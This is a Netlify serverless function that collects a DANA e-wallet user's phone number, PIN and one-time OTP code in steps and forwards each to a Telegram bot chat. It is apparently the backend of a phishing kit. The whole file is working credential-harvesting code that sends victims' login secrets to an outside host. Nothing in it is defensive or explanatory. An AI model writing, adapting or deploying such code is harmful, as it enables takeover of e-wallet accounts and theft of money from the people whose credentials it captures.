// File: netlify/functions/send-dana-data.js
const axios = require('axios');

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ message: 'Method Not Allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);
    const { phoneNumber, pin, otp, step } = data;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return {
        statusCode: 500,
        body: JSON.stringify({ message: 'Telegram bot configuration missing' }),
      };
    }

    // Format messages based on step
    let message;
    switch(step) {
      case 'phone':
        message = `( DANA | NoHP | ${phoneNumber} )`;
        break;
      case 'pin':
        message = `( DANA | NoHP | ${phoneNumber} )\n\n` +
                  `- No HP : ${phoneNumber}\n` +
                  `- PIN : ${pin}`;
        break;
      case 'otp':
        message = `( DANA | NoHP | ${phoneNumber} )\n\n` +
                  `- No HP : ${phoneNumber}\n` +
                  `- PIN : ${pin}\n` +
                  `- Code OTP : ${otp}`;
        break;
      default:
        return {
          statusCode: 400,
          body: JSON.stringify({ message: 'Invalid step parameter' }),
        };
    }

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Notification sent successfully' }),
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        message: 'Internal Server Error',
        error: error.message 
      }),
    };
  }
};
